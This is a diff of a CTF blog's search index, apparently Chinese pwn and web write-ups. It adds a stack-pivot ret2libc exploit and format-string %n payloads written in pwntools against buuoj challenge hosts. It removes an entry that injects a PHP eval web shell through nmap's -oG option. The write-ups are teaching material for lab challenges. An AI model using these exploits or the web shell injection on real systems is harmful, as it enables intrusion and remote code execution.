@@ -1,6 +1,68 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BlackWatch入群题-PWN</title>
+    <url>/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98PWN/</url>
+    <content><![CDATA[<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p><img src="/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98PWN/1.jpg"></p>
+<p>checksec查看，得到32位，并且不可执行shellcode，使用ida查看代码，代码如下，查看字符串，没有发现’&#x2F;bin&#x2F;sh’</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vul_function();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodBye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);      <span class="comment">//s是bss段的一段内存，无法溢出到</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);    <span class="comment">//只能溢出0x8的空间，也就是只能覆盖到ebp和ret，明显的栈迁移</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该题的解题思路就是栈迁移+libc，我们可以把payload写在bss段上，然后覆盖ebp和ret，把ebp覆盖成bss地址-4，把ret覆盖成leave ret。</p>
+<p>那么，leave就会mov esp ebp   pop ebp，然后到ret。这样把bss段的第一个地址当成ret地址了，可以执行函数。注意这种不是shellcode不要求有执行栈的权限。</p>
+<p><img src="/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98PWN/2.jpg"></p>
+<p>完整payload如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25396</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">func_addr = <span class="number">0x0804849B</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">leave_ret_addr = <span class="number">0x08048408</span> <span class="comment"># ROPgadget --binary rop --only &quot;leave|ret&quot;</span></span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在read的bss端读入rop链</span></span><br><span class="line"></span><br><span class="line">payload = p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(main_addr) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈迁移原理：ebp覆盖成目标内存地址，leave;ret=&gt;mov esp ebp;pop ebp;pop eip;call eip;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># esp指向bss段，这就是栈迁移</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x18</span> * <span class="string">&#x27;a&#x27;</span> + p32(bss_addr-<span class="number">4</span>) + p32(leave_ret_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;say?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr: &#x27;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一定要用LibcSearcher</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system[%s],binsh[%s]&#x27;</span> % (<span class="built_in">hex</span>(system_addr), <span class="built_in">hex</span>(binsh_addr)))</span><br><span class="line"></span><br><span class="line">payload = p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x18</span> * <span class="string">&#x27;a&#x27;</span> + p32(bss_addr-<span class="number">4</span>) + p32(leave_ret_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;say?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>32bit</tag>
+        <tag>栈迁移</tag>
+        <tag>ret2libc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ciscn_2019_es_2</title>
+    <url>/PWN5/</url>
+    <content><![CDATA[<h1 id="PWN5"><a href="#PWN5" class="headerlink" title="PWN5"></a>PWN5</h1><p>格式化字符串漏洞导致栈的读栈上的值并修改bss段的值覆盖随机值</p>
+<p><a href="https://blog.csdn.net/BangSen1/article/details/115191602">https://blog.csdn.net/BangSen1/article/details/115191602</a></p>
+<p><a href="https://blog.csdn.net/mcmuyanga/article/details/108253515">https://blog.csdn.net/mcmuyanga/article/details/108253515</a></p>
+<p>拿到文件，使用checksec进行测试，得到如下结果，为32位，开启了栈溢出保护和栈执行保护</p>
+<p><img src="/PWN5/PWN5(1).png"></p>
+<p>使用IDA打开查看main函数，代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF      //输入区，局部变量，存放到栈中，可以利用printf的格式化漏洞来读栈</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line">  </span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  srand(v1);</span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);    <span class="comment">//随机化种子</span></span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);    <span class="comment">//写入随机数到dword_804C044中</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )    <span class="comment">//将nptr字符串转为int值，并且判断是否与随机值相同，</span></span><br><span class="line">  &#123;</span><br><span class="line">​    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">​    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">​    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">​    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注意，该类格式化漏洞是由scanf和printf组合出来的，即scanf的内容就是printf的内容，这样我们就可以控制输入的内容，操作printf的参数。</p>
+<p>有关格式化漏洞<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p>
+<p>可以使用使用printf的 %08x来以8个16进制的长度打印栈的内容（栈的长度对应32位，4个字节，8个16进制数字），这个读取是低地址到高地址的读，例如这里的scanf是输入到一个数组，而printf则从这个数组的首地址开始读，前面会有部分的填充，但只要使用足够多的%08x就能读到输入内容的地方。</p>
+<p><img src="/PWN5/PWN5(2).png"></p>
+<p>使用AAAA %08x %08x %8x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x 去测量，空格作为分隔符。AAAA的ASCII码就是414141，而41414141在第10个（1开始）偏移量为10。</p>
+<p>使用%n来写入到bss段，覆盖随机值，这里使用dd双字来声明，也就是双字，4个字节。</p>
+<p><img src="/PWN5/PWN5(3).png"></p>
+<p>构造payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding = utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;local:1/remote:2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">select = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">​    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26980</span>)</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x804c044</span>)+p32(<span class="number">0x804c045</span>)+p32(<span class="number">0x804c046</span>)+p32(<span class="number">0x804c047</span>)    //%n默认写入的是<span class="number">4</span>个字节，因此需要<span class="number">4</span>个地址    </span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span>     //%&lt;偏移&gt;$n  用于写入到前面地址的内容</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))       //也就是十进制的<span class="number">269488144</span>，它是把写入的内容连起来。</span><br><span class="line"></span><br><span class="line">//这里输入<span class="number">4</span>个<span class="number">0x10</span>是因为我们payload的地址部分，不是格式化打印部分写入了<span class="number">16</span>长度的内容，一个p32函数转了<span class="number">4</span>个字符的地址</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>payload2，这次只通过%n一次性输入4个字节把dd的四个字节全部覆盖了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26980</span>)</span><br><span class="line"></span><br><span class="line">unk_804C044_addr=<span class="number">0x0804C044</span></span><br><span class="line"></span><br><span class="line">payload=p32(unk_804C044_addr)+<span class="string">&#x27;%10$n&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>总结本题的思路，首先是通过%08x这种方式打印，找到输出字符的偏移量，然后找出随机值的bss段地址，使用%xx$n赋值到该段地址中，然后输入与%n相对应的值，得到shell，在根目录上找到flag。</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>32bit</tag>
+        <tag>格式化字符串漏</tag>
+        <tag>写bss</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ret2lib</title>
     <url>/babyrop/</url>
     <content><![CDATA[<h1 id="babyrop-ret2lib"><a href="#babyrop-ret2lib" class="headerlink" title="babyrop  ret2lib"></a>babyrop  ret2lib</h1><p>checksec查看，只开启了栈执行保护，是32位的，使用ida查看字符串，没有看到’&#x2F;bin&#x2F;sh’，排除ROPgadget构造System(‘&#x2F;bin&#x2F;sh’)，查看反编译的代码如下：</p>
@@ -24,39 +86,8 @@
         <category>pwn</category>
       </categories>
       <tags>
-        <tag>ret2libc</tag>
         <tag>32bit</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网鼎杯2020朱雀组-Nmap</title>
-    <url>/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/</url>
-    <content><![CDATA[<ol>
-<li>打开页面</li>
-</ol>
-<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_20,color_FFFFFF,t_70,g_se,x_16-20220718172428863.png" alt="img"></p>
-<p> 2.利用<a href="https://so.csdn.net/so/search?q=NMAP&spm=1001.2101.3001.7020">NMAP</a>里的-oG命令实现代码的写入，那我们这里就可以尝试构造payload，来利用‘拼接，写入我们想要的shell文件</p>
-<p>我们直接用那道buu里的payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt; -oG zhuque.php&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>注入之后发现存在过滤，fuzz,过滤了php</p>
-<p>（1）利用&lt;?&#x3D;来代替&lt;?php进行绕过<br>（2）利用phtml来代替shell.php的文件后缀</p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?= eval($_POST[&quot;cmd&quot;]);?&gt; -oG zhuque.phtml&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_20,color_FFFFFF,t_70,g_se,x_16-20220718172548382.png" alt="img"></p>
-<p> 上传成功</p>
-<p>3.打开蚁剑</p>
-<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_19,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p>
-<p> 在根目录下找到flag</p>
-<p><img src="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Y2K5p2v6Zuo5rC05pWs6L-H5a6i,size_20,color_FFFFFF,t_70,g_se,x_16-20220718172608276.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>命令注入</tag>
-        <tag>nmap</tag>
+        <tag>ret2libc</tag>
       </tags>
   </entry>
   <entry>
@@ -78,29 +109,6 @@
       <tags>
         <tag>ret2libc</tag>
         <tag>64bit</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BlackWatch入群题-PWN</title>
-    <url>/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98PWN/</url>
-    <content><![CDATA[<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p><img src="/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98PWN/1.jpg"></p>
-<p>checksec查看，得到32位，并且不可执行shellcode，使用ida查看代码，代码如下，查看字符串，没有发现’&#x2F;bin&#x2F;sh’</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vul_function();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodBye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);      <span class="comment">//s是bss段的一段内存，无法溢出到</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);    <span class="comment">//只能溢出0x8的空间，也就是只能覆盖到ebp和ret，明显的栈迁移</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>该题的解题思路就是栈迁移+libc，我们可以把payload写在bss段上，然后覆盖ebp和ret，把ebp覆盖成bss地址-4，把ret覆盖成leave ret。</p>
-<p>那么，leave就会mov esp ebp   pop ebp，然后到ret。这样把bss段的第一个地址当成ret地址了，可以执行函数。注意这种不是shellcode不要求有执行栈的权限。</p>
-<p><img src="/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98PWN/2.jpg"></p>
-<p>完整payload如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25396</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">func_addr = <span class="number">0x0804849B</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">leave_ret_addr = <span class="number">0x08048408</span> <span class="comment"># ROPgadget --binary rop --only &quot;leave|ret&quot;</span></span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在read的bss端读入rop链</span></span><br><span class="line"></span><br><span class="line">payload = p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(main_addr) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈迁移原理：ebp覆盖成目标内存地址，leave;ret=&gt;mov esp ebp;pop ebp;pop eip;call eip;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># esp指向bss段，这就是栈迁移</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x18</span> * <span class="string">&#x27;a&#x27;</span> + p32(bss_addr-<span class="number">4</span>) + p32(leave_ret_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;say?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr: &#x27;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一定要用LibcSearcher</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system[%s],binsh[%s]&#x27;</span> % (<span class="built_in">hex</span>(system_addr), <span class="built_in">hex</span>(binsh_addr)))</span><br><span class="line"></span><br><span class="line">payload = p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x18</span> * <span class="string">&#x27;a&#x27;</span> + p32(bss_addr-<span class="number">4</span>) + p32(leave_ret_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;say?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>ret2libc</tag>
-        <tag>32bit</tag>
-        <tag>栈迁移</tag>
       </tags>
   </entry>
   <entry>
@@ -142,9 +150,9 @@
       <tags>
         <tag>ret2libc</tag>
         <tag>64bit</tag>
-        <tag>堆栈平衡</tag>
         <tag>gets</tag>
         <tag>strlen</tag>
+        <tag>堆栈平衡</tag>
       </tags>
   </entry>
   <entry>
@@ -191,9 +199,9 @@
         <category>pwn</category>
       </categories>
       <tags>
-        <tag>ret2libc</tag>
         <tag>32bit</tag>
         <tag>栈迁移</tag>
+        <tag>ret2libc</tag>
       </tags>
   </entry>
   <entry>
@@ -305,9 +313,9 @@
         <category>pwn</category>
       </categories>
       <tags>
+        <tag>栈迁移</tag>
         <tag>ret2libc</tag>
         <tag>64bit</tag>
-        <tag>栈迁移</tag>
       </tags>
   </entry>
   <entry>
@@ -330,8 +338,8 @@
       </categories>
       <tags>
         <tag>32bit</tag>
-        <tag>执行system函数</tag>
         <tag>写bss</tag>
+        <tag>执行system函数</tag>
       </tags>
   </entry>
   <entry>
@@ -444,8 +452,8 @@
         <category>pwn</category>
       </categories>
       <tags>
-        <tag>ret2libc</tag>
         <tag>32bit</tag>
+        <tag>ret2libc</tag>
       </tags>
   </entry>
   <entry>
@@ -535,48 +543,9 @@
         <category>pwn</category>
       </categories>
       <tags>
+        <tag>32bit</tag>
         <tag>ret2libc</tag>
-        <tag>32bit</tag>
         <tag>整数溢出</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ciscn_2019_es_2</title>
-    <url>/PWN5/</url>
-    <content><![CDATA[<h1 id="PWN5"><a href="#PWN5" class="headerlink" title="PWN5"></a>PWN5</h1><p>格式化字符串漏洞导致栈的读栈上的值并修改bss段的值覆盖随机值</p>
-<p><a href="https://blog.csdn.net/BangSen1/article/details/115191602">https://blog.csdn.net/BangSen1/article/details/115191602</a></p>
-<p><a href="https://blog.csdn.net/mcmuyanga/article/details/108253515">https://blog.csdn.net/mcmuyanga/article/details/108253515</a></p>
-<p>拿到文件，使用checksec进行测试，得到如下结果，为32位，开启了栈溢出保护和栈执行保护</p>
-<p><img src="/PWN5/PWN5(1).png"></p>
-<p>使用IDA打开查看main函数，代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF      //输入区，局部变量，存放到栈中，可以利用printf的格式化漏洞来读栈</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line">  </span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  srand(v1);</span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);    <span class="comment">//随机化种子</span></span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);    <span class="comment">//写入随机数到dword_804C044中</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )    <span class="comment">//将nptr字符串转为int值，并且判断是否与随机值相同，</span></span><br><span class="line">  &#123;</span><br><span class="line">​    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">​    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">​    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">​    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>注意，该类格式化漏洞是由scanf和printf组合出来的，即scanf的内容就是printf的内容，这样我们就可以控制输入的内容，操作printf的参数。</p>
-<p>有关格式化漏洞<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p>
-<p>可以使用使用printf的 %08x来以8个16进制的长度打印栈的内容（栈的长度对应32位，4个字节，8个16进制数字），这个读取是低地址到高地址的读，例如这里的scanf是输入到一个数组，而printf则从这个数组的首地址开始读，前面会有部分的填充，但只要使用足够多的%08x就能读到输入内容的地方。</p>
-<p><img src="/PWN5/PWN5(2).png"></p>
